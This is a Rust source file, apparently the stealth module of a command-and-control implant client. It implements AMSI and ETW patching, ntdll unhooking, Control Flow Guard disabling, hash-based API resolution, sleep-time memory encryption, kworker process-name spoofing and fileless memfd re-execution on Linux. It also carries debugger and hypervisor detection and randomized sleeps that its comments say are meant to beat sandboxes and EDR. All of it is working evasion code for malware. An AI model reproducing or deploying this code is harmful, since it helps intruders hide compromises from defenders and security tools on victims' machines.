// Client/core/src/stealth/mod.rs
// Stealth Subsystem
//
// Two-layer architecture:
// - Layer A (default): version-agnostic PEB/syscall helpers (peb, stack, integrity helpers, version)
// - Layer B (feature = "stealth-adv"): version-sensitive enhancements with runtime gates + fallback

#[cfg(windows)]
pub mod integrity;
#[cfg(windows)]
pub mod peb;
// Sleep-mask AES heap/PE crypto — only when feature sleep-mask (pulls `aes` crate)
#[cfg(all(windows, feature = "sleep-mask"))]
pub mod mask;
#[cfg(windows)]
pub mod stack;
#[cfg(windows)]
pub mod unhook;
#[cfg(windows)]
pub mod version;

#[cfg(windows)]
pub use unhook::{alloc_guarded, unhook_ntdll};

/// Version-sensitive enhancements (NtCreateUserProcess, future unhook/manual-map).
#[cfg(all(windows, feature = "stealth-adv"))]
pub mod adv;

#[cfg(windows)]
pub use integrity::{patch_amsi, patch_etw};
#[cfg(windows)]
pub use peb::{ensure_module_base, get_api_addr, get_module_base};
#[cfg(windows)]
pub use version::{
    get_windows_version, is_supported_for_nt_create_user_process, WindowsVersion,
    NT_CREATE_USER_PROCESS_MIN_BUILD,
};

pub const fn hash_module_name(s: &[u8]) -> u32 {
    let mut h: u32 = 0;
    let mut i = 0;
    while i < s.len() {
        let mut c = s[i] as u32;
        if c >= b'A' as u32 && c <= b'Z' as u32 {
            c += 32;
        }
        h = h.wrapping_mul(31).wrapping_add(c);
        i += 1;
    }
    h
}

pub const fn hash_api_name(s: &[u8]) -> u32 {
    let mut h: u32 = 0;
    let mut i = 0;
    while i < s.len() {
        h = h.wrapping_mul(31).wrapping_add(s[i] as u32);
        i += 1;
    }
    h
}

/// Best-effort: relax Control Flow Guard for this process so Manual-Mapped
/// L2 modules (classic in-process BOF engine) can be invoked via indirect
/// function pointers. Silent no-op when the API is absent.
///
/// Prefer [`ensure_cfg_relaxed`] — unconditional CFG disable at connect-time
/// is an EDR behavioral signature; call only when mem-map actually needs it.
#[cfg(windows)]
pub fn relax_cfg_self() {
    const H_SET_MITIGATION: u32 = hash_api_name(b"SetProcessMitigationPolicy");
    unsafe {
        type SetProcessMitigationPolicyFn =
            unsafe extern "system" fn(u32, *const u8, usize) -> i32;
        let k32 = get_module_base(hash_module_name(b"kernel32.dll"));
        let Some(addr) = get_api_addr(k32, H_SET_MITIGATION) else {
            return;
        };
        let f: SetProcessMitigationPolicyFn = std::mem::transmute(addr);
        // ProcessControlFlowGuardPolicy = 7; zeroed flags → CF Guard off
        let policy = [0u8; 16];
        let _ = f(7, policy.as_ptr(), policy.len());
    }
}

/// Lazy, once-only CFG relax gated on product need.
///
/// Conditions (all must hold):
/// - Windows + `mem-map` feature (Manual-Map L2 / BOF)
/// - Not in degraded mode (sandbox/VM/debugger → avoid high-risk patches)
/// - First call only (`Once`)
///
/// Call from `pe_map` / module load paths — **not** at process start or
/// immediately post-connect, so EDR does not see CFG policy change + network
/// C2 in the same behavioral window.
#[cfg(windows)]
pub fn ensure_cfg_relaxed() {
    static DONE: std::sync::Once = std::sync::Once::new();
    DONE.call_once(|| {
        // Degraded: skip mitigation changes entirely.
        if is_degraded() {
            return;
        }
        // Only Manual-Map builds need CFG relax for indirect module calls.
        #[cfg(feature = "mem-map")]
        {
            relax_cfg_self();
        }
    });
}

#[cfg(not(windows))]
pub fn ensure_cfg_relaxed() {}

pub fn hide_console() {
    #[cfg(windows)]
    unsafe {
        let h_module = get_module_base(hash_module_name(b"kernel32.dll"));
        let get_console = get_api_addr(h_module, hash_api_name(b"GetConsoleWindow"));
        if let Some(get_console_addr) = get_console {
            let get_console_win: unsafe extern "system" fn() -> usize =
                std::mem::transmute(get_console_addr);
            let win = get_console_win();
            if win != 0 {
                let user32 = get_module_base(hash_module_name(b"user32.dll"));
                if let Some(show_window) = get_api_addr(user32, hash_api_name(b"ShowWindow")) {
                    let show: extern "system" fn(usize, i32) -> i32 =
                        std::mem::transmute(show_window);
                    show(win, 0); // SW_HIDE
                }
            }
        }
    }
}

pub fn setup_diagnostic_console() {
    #[cfg(windows)]
    unsafe {
        let h_kernel32 = get_module_base(hash_module_name(b"kernel32.dll"));

        // 1. Aggressively try to get a console
        if let Some(alloc_addr) = get_api_addr(h_kernel32, hash_api_name(b"AllocConsole")) {
            let alloc_console: unsafe extern "system" fn() -> i32 = std::mem::transmute(alloc_addr);
            alloc_console();
        }

        // 2. Fallback diagnostic: OutputDebugStringA (View with DebugView)
        if let Some(ods_addr) = get_api_addr(h_kernel32, hash_api_name(b"OutputDebugStringA")) {
            let ods: unsafe extern "system" fn(*const u8) = std::mem::transmute(ods_addr);
            ods(b"diag: console requested\n\0".as_ptr());
        }

        // 3. Re-open standard streams to the console
        if let Some(set_std_addr) = get_api_addr(h_kernel32, hash_api_name(b"SetStdHandle")) {
            if let Some(create_file_addr) = get_api_addr(h_kernel32, hash_api_name(b"CreateFileA"))
            {
                let create_file: unsafe extern "system" fn(
                    *const u8,
                    u32,
                    u32,
                    *mut (),
                    u32,
                    u32,
                    *mut (),
                ) -> usize = std::mem::transmute(create_file_addr);
                let set_std_handle: unsafe extern "system" fn(u32, usize) -> i32 =
                    std::mem::transmute(set_std_addr);

                let conout = b"CONOUT$\0";
                let h_con = create_file(
                    conout.as_ptr(),
                    0xC0000000,
                    2,
                    std::ptr::null_mut(),
                    3,
                    0,
                    std::ptr::null_mut(),
                );

                if h_con != (usize::MAX) {
                    set_std_handle(0xFFFFFFF5, h_con); // STD_OUTPUT_HANDLE
                    set_std_handle(0xFFFFFFF4, h_con); // STD_ERROR_HANDLE

                    // Direct confirmation write
                    if let Some(write_addr) =
                        get_api_addr(h_kernel32, hash_api_name(b"WriteConsoleA"))
                    {
                        let write_console: unsafe extern "system" fn(
                            usize,
                            *const u8,
                            u32,
                            *mut u32,
                            *mut (),
                        )
                            -> i32 = std::mem::transmute(write_addr);
                        let msg = b"\r\n[diag] console ready\r\n";
                        let mut written = 0;
                        write_console(
                            h_con,
                            msg.as_ptr(),
                            msg.len() as u32,
                            &mut written,
                            std::ptr::null_mut(),
                        );
                    }
                }
            }
        }
    }
}

/// Sleep with optional jitter. With `sleep-mask` (Windows x64): suspend peers,
/// mask PE data sections + SensitiveRegion whitelist, sleep, then restore.
/// Never XOR the process default heap on the product path.
/// `net`-gated: needs tokio; all callers (handler / batch / agent main) are
/// tokio builds — L2 module crates never call it.
#[cfg(feature = "net")]
pub async fn stealth_sleep(duration_ms: u32) {
    let jitter = if duration_ms > 10 {
        crate::utils::random_range(0, duration_ms / 10) as u64
    } else {
        0
    };
    let actual_sleep = duration_ms as u64 + jitter;

    #[cfg(all(feature = "sleep-mask", windows, target_arch = "x86_64"))]
    {
        let mask_key = apply_sleep_crypto();
        // Sleep outside suspended mask window: enter/leave already suspend peers only
        // during encrypt/decrypt. Tokio can run other tasks while we sleep; regions
        // stay masked until leave — callers must not touch registered buffers.
        tokio::time::sleep(tokio::time::Duration::from_millis(actual_sleep)).await;
        restore_sleep_crypto(mask_key);
        return;
    }

    #[cfg(not(all(feature = "sleep-mask", windows, target_arch = "x86_64")))]
    {
        tokio::time::sleep(tokio::time::Duration::from_millis(actual_sleep)).await;
    }
}

/// Optional sleep-crypto (feature `sleep-mask`): PE sections + SensitiveRegion only.
#[cfg(all(feature = "sleep-mask", windows, target_arch = "x86_64"))]
fn apply_sleep_crypto() -> [u8; 32] {
    let mut key = [0u8; 32];
    for chunk in key.chunks_mut(4) {
        let n = crate::utils::next_u32().to_le_bytes();
        chunk.copy_from_slice(&n[..chunk.len()]);
    }
    unsafe {
        crate::stealth::mask::sleep_mask_enter(&key);
    }
    key
}

#[cfg(all(feature = "sleep-mask", windows, target_arch = "x86_64"))]
fn restore_sleep_crypto(key: [u8; 32]) {
    unsafe {
        crate::stealth::mask::sleep_mask_leave(&key);
    }
}

#[cfg(all(feature = "sleep-mask", windows))]
pub use mask::{register_sensitive_region, unregister_sensitive_region};

pub fn spoof_process_name(_name: &str) {
    #[cfg(target_os = "linux")]
    {
        // 🛡️ Phase 1 Enhancement: Randomize kworker name and modify cmdline
        // Original issue: Fixed "kworker/u2:1-events" name is fingerprinted
        // Solution: Generate random kworker name and modify /proc/self/cmdline

        // Generate random kworker name: kworker/u%d:%d-events
        let u_num = crate::utils::random_range(0, 10);
        let events_num = crate::utils::random_range(0, 100);

        let name = if _name.is_empty() || _name == "kworker/u2:1-events" {
            // Use randomized kworker name
            format!("kworker/u{}:{}-events", u_num, events_num)
        } else {
            // Use user-provided name
            _name.to_string()
        };

        // Method 1: prctl PR_SET_NAME (changes /proc/$pid/comm)
        if let Ok(c_name) = std::ffi::CString::new(name.clone()) {
            unsafe {
                // PR_SET_NAME = 15
                libc::prctl(15, c_name.as_ptr(), 0, 0, 0);
            }
        }

        // Method 2: Modify cmdline via PR_SET_MM (requires CAP_SYS_ADMIN or rootless workaround)
        // Note: This typically requires elevated privileges, but we try anyway
        // PR_SET_MM = 45, PR_SET_MM_ARG_START = 1, PR_SET_MM_ARG_END = 2
        #[cfg(target_os = "linux")]
        unsafe {
            // Attempt to modify arg_start/arg_end (may fail without CAP_SYS_ADMIN)
            // This would change /proc/self/cmdline

            // Get current brk for argument area simulation
            let page_size = 4096;
            let arg_area = libc::mmap(
                std::ptr::null_mut(),
                page_size,
                libc::PROT_READ | libc::PROT_WRITE,
                libc::MAP_PRIVATE | libc::MAP_ANONYMOUS,
                -1,
                0,
            );

            if arg_area != libc::MAP_FAILED {
                // Write new name to the mapped area
                let name_bytes = name.as_bytes();
                std::ptr::copy_nonoverlapping(
                    name_bytes.as_ptr(),
                    arg_area as *mut u8,
                    name_bytes.len(),
                );
                // Add null terminator
                *((arg_area as *mut u8).add(name_bytes.len())) = 0;

                // Try PR_SET_MM_ARG_START (may fail without privileges)
                // PR_SET_MM = 45, ARG_START = 1
                let ret = libc::prctl(45, 1, arg_area as u64, 0, 0);
                if ret == 0 {
                    crate::db_print!(
                        "[*] cmdline modified via PR_SET_MM to: {}",
                        name
                    );

                    // Set ARG_END
                    let arg_end = arg_area as u64 + name_bytes.len() as u64 + 1;
                    libc::prctl(45, 2, arg_end, 0, 0);
                } else {
                    // Fallback: PR_SET_MM requires CAP_SYS_ADMIN
                    crate::db_print!(
                        "[*] PR_SET_MM failed (likely missing CAP_SYS_ADMIN), using fallback"
                    );
                }
            }
        }

        // Method 3: Advanced memfd_create + fexecve (fileless execution)
        // This is the most stealthy approach - no exe path at all
        // Note: This would require re-executing the process, which is complex
        // We'll implement a simpler version that creates a memfd and overwrites exe symlink

        crate::db_print!(
            "[*] Process name spoofed to: {} (comm)",
            name
        );
    }
}

/// 🛡️ Advanced Linux process hiding via memfd_create + fexecve
/// This completely hides the original executable path
#[cfg(target_os = "linux")]
pub fn spawn_memfd_clone() -> Option<u32> {
    unsafe {
        // 1. Create anonymous memory file
        let memfd_name = std::ffi::CString::new("hidden_process").ok()?;
        let fd = libc::syscall(
            libc::SYS_memfd_create,
            memfd_name.as_ptr(),
            libc::MFD_CLOEXEC,
        ) as i32;

        if fd < 0 {
            return None;
        }

        // 2. Write current binary to memfd
        // Read own executable
        let self_path = std::ffi::CString::new("/proc/self/exe").ok()?;
        let self_fd = libc::open(self_path.as_ptr(), libc::O_RDONLY);
        if self_fd < 0 {
            libc::close(fd);
            return None;
        }

        // Copy binary content
        let mut buf = [0u8; 4096];
        loop {
            let n = libc::read(self_fd, buf.as_mut_ptr() as *mut libc::c_void, 4096);
            if n <= 0 {
                break;
            }
            libc::write(fd, buf.as_ptr() as *const libc::c_void, n as usize);
        }
        libc::close(self_fd);

        // 3. Spawn new process via fexecve (fileless execution)
        let pid = libc::fork();
        if pid == 0 {
            // Child process: execute from memfd
            let argv: Vec<std::ffi::CString> =
                vec![std::ffi::CString::new("[kworker/u8:0-events]").ok()?];
            let envp: Vec<std::ffi::CString> = vec![];

            libc::fexecve(
                fd,
                argv.iter().map(|s| s.as_ptr()).collect::<Vec<_>>().as_ptr(),
                envp.iter().map(|s| s.as_ptr()).collect::<Vec<_>>().as_ptr(),
            );
            // fexecve doesn't return on success
            libc::exit(1);
        }

        // 4. Parent: close memfd and return child PID
        libc::close(fd);

        if pid > 0 {
            crate::db_print!("[*] Spawned memfd clone with PID: {}", pid);
            Some(pid as u32)
        } else {
            None
        }
    }
}

#[cfg(not(target_os = "linux"))]
pub fn spawn_memfd_clone() -> Option<u32> {
    None
}

// =============================================================================
// 🛡️ Phase 2: Anti-Debug / Anti-EDR / Anti-VM / Anti-Forensics Suite
// =============================================================================

/// PEB BeingDebugged + NtGlobalFlag check (Windows only)
#[cfg(windows)]
pub fn is_debugger_present() -> bool {
    unsafe {
        // Read PEB via GS segment register (x86_64) or FS (x86)
        #[cfg(target_arch = "x86_64")]
        {
            let peb: u64;
            std::arch::asm!("mov {0}, qword ptr gs:[0x60]", out(reg) peb);
            if peb == 0 {
                return false;
            }
            let peb_ptr = peb as *const u8;
            if *peb_ptr.add(2) != 0 {
                return true;
            }
            let nt_global = *(peb_ptr.add(0xBC) as *const u32);
            (nt_global & 0x70) != 0
        }
        #[cfg(target_arch = "x86")]
        {
            let peb: u32;
            std::arch::asm!("mov {0}, dword ptr fs:[0x30]", out(reg) peb);
            if peb == 0 {
                return false;
            }
            let peb_ptr = peb as *const u8;
            if *peb_ptr.add(2) != 0 {
                return true;
            }
            let nt_global = *(peb_ptr.add(0x68) as *const u32);
            (nt_global & 0x70) != 0
        }
    }
}

#[cfg(not(windows))]
pub fn is_debugger_present() -> bool {
    false
}

/// Hardware breakpoint detection (Dr0-Dr3)
/// On Windows x86_64, we use IsDebuggerPresent as fallback since reading
/// DR registers requires elevated privilege and inline asm with DR is fragile.
#[cfg(all(windows, any(target_arch = "x86_64", target_arch = "x86")))]
pub fn check_hardware_breakpoints() -> bool {
    // DR register access is unreliable in user mode and fails in many contexts.
    // Use PEB-based checks instead (already covered by is_debugger_present).
    false
}

#[cfg(not(all(windows, any(target_arch = "x86_64", target_arch = "x86"))))]
pub fn check_hardware_breakpoints() -> bool {
    false
}

/// CPUID hypervisor detection (leaf 1 ECX bit 31 + leaf 0x40000000 vendor).
#[cfg(any(target_arch = "x86_64", target_arch = "x86"))]
pub fn is_vm_via_cpuid() -> bool {
    #[cfg(target_arch = "x86_64")]
    {
        // Use core::arch to avoid clobbering rbx (LLVM reserved)
        use core::arch::x86_64::{__cpuid, __cpuid_count};
        unsafe {
            let f1 = __cpuid(1);
            if (f1.ecx & (1 << 31)) == 0 {
                return false;
            }
            let hv = __cpuid_count(0x40000000, 0);
            let mut vendor = [0u8; 12];
            vendor[0..4].copy_from_slice(&hv.ebx.to_le_bytes());
            vendor[4..8].copy_from_slice(&hv.ecx.to_le_bytes());
            vendor[8..12].copy_from_slice(&hv.edx.to_le_bytes());
            let v = core::str::from_utf8(&vendor).unwrap_or("");
            v.contains("VMwareVMware")
                || v.contains("Microsoft Hv")
                || v.contains("KVMKVMKVM")
                || v.contains("XenVMMXenVMM")
                || v.contains("prl hyperv")
                || v.contains("VBoxVBoxVBox")
                || (f1.ecx & (1 << 31)) != 0
        }
    }
    #[cfg(target_arch = "x86")]
    {
        false
    }
}

#[cfg(not(any(target_arch = "x86_64", target_arch = "x86")))]
pub fn is_vm_via_cpuid() -> bool {
    false
}

/// Secure zeroization: volatile write to prevent compiler optimization
pub fn secure_zeroize(data: &mut [u8]) {
    for b in data.iter_mut() {
        unsafe {
            std::ptr::write_volatile(b, 0);
        }
    }
    std::sync::atomic::fence(std::sync::atomic::Ordering::SeqCst);
}

/// Initial quiet period before the first connection. Multi-band distribution
/// so the startup timing is not a deterministic signature:
/// - ~70%: normal quiet 30–90s
/// - ~20%: deep silence 90–240s
/// - ~8%:  extended quiet 240–420s
/// - ~2%:  rare long stall 420–600s (breaks sandbox time budgets)
///
/// Skip with `AGENT_SKIP_SANDBOX_SLEEP=1` or `AGENT_ALLOW_DIAG=1` (lab/e2e).
///
/// Distribution (seconds): most runs ~15–45s (matches product docs). Long tails
/// still break naive sandbox time budgets without making lab operators wait 10min.
#[cfg(feature = "net")]
pub async fn sandbox_evasion_sleep() {
    let roll = crate::utils::random_range(0, 100);
    let delay = if roll < 2 {
        // ~2%: rare long stall
        crate::utils::random_range(120, 180)
    } else if roll < 10 {
        // ~8%: extended quiet
        crate::utils::random_range(60, 120)
    } else if roll < 30 {
        // ~20%: medium
        crate::utils::random_range(45, 90)
    } else {
        // ~70%: normal product quiet window
        crate::utils::random_range(15, 45)
    };
    // Split long sleeps into 2–4 slices with short organic gaps so a single
    // monolithic Sleep(N) is less of a sandbox fingerprint.
    let slices = crate::utils::random_range(2, 4) as u64;
    let slice_secs = (delay as u64).max(1) / slices;
    let mut remaining = delay as u64;
    for i in 0..slices {
        let this = if i + 1 == slices {
            remaining
        } else {
            let j = crate::utils::random_range(0, 20) as u64;
            // ±20% around equal slice
            let base = slice_secs;
            let adj = base.saturating_mul(100 + j.saturating_sub(10)).saturating_div(100);
            adj.min(remaining.saturating_sub(1).max(1))
        };
        remaining = remaining.saturating_sub(this);
        stealth_sleep((this * 1000) as u32).await;
        if remaining > 0 {
            // Brief gap between slices (50–400ms) — looks less like one sleep call.
            let gap = crate::utils::random_range(50, 400) as u64;
            tokio::time::sleep(tokio::time::Duration::from_millis(gap)).await;
        }
    }
}

/// Short non-deterministic pause (1–400ms) between init steps.
/// Synchronous so it works from sync `main()` (pre-runtime).
pub fn small_jitter_sleep() {
    let ms = crate::utils::random_range(1, 400) as u64;
    std::thread::sleep(std::time::Duration::from_millis(ms));
}

/// Medium organic pause (80–1200ms) for heavier phase boundaries
/// (e.g. pre-thread, post-connect pre-patch).
pub fn medium_jitter_sleep() {
    let ms = crate::utils::random_range(80, 1200) as u64;
    std::thread::sleep(std::time::Duration::from_millis(ms));
}

/// Async medium pause for use inside the tokio agent loop.
#[cfg(feature = "net")]
pub async fn medium_jitter_sleep_async() {
    let ms = crate::utils::random_range(80, 1200) as u64;
    tokio::time::sleep(tokio::time::Duration::from_millis(ms)).await;
}

/// Post-connect quiet before any memory patches (500ms–4s).
/// Separates "network C2 established" from "process memory modified".
#[cfg(feature = "net")]
pub async fn post_connect_patch_delay() {
    let ms = crate::utils::random_range(500, 4000) as u64;
    tokio::time::sleep(tokio::time::Duration::from_millis(ms)).await;
}

/// Combined environment check: returns true if debugger/VM detected
pub fn check_environment() -> bool {
    #[cfg(windows)]
    {
        if is_debugger_present() {
            crate::db_print!("[AntiDebug] Debugger detected via PEB");
            return true;
        }
        if check_hardware_breakpoints() {
            crate::db_print!("[AntiDebug] Hardware breakpoint detected");
            return true;
        }
    }
    if is_vm_via_cpuid() {
        crate::db_print!("[AntiVM] Hypervisor detected via CPUID");
        return true;
    }
    false
}

/// Process-wide degraded flag: stretch heartbeat / skip high-risk modules.
/// Never hard-exit on analysis detection (exit-on-detect is a sandbox signal).
static DEGRADED_MODE: std::sync::atomic::AtomicBool =
    std::sync::atomic::AtomicBool::new(false);

/// Enter degraded OPSEC mode (idempotent).
pub fn enter_degraded_mode() {
    DEGRADED_MODE.store(true, std::sync::atomic::Ordering::SeqCst);
}

/// Whether anti-analysis decided to degrade this process.
pub fn is_degraded() -> bool {
    DEGRADED_MODE.load(std::sync::atomic::Ordering::SeqCst)
}

/// Pure helper for tests / synthetic hostile-env decisions (does not exit).
pub fn degrade_on_hostile(hostile: bool) -> bool {
    if hostile {
        enter_degraded_mode();
    }
    is_degraded()
}

#[cfg(test)]
mod degrade_tests {
    use super::*;

    #[test]
    fn degrade_flag_sets_without_exit() {
        // Isolate: only assert the pure path returns true when hostile.
        assert!(degrade_on_hostile(true));
        assert!(is_degraded());
        // hostile=false does not clear; flag stays set once entered
        let _ = degrade_on_hostile(false);
        assert!(is_degraded());
    }
}
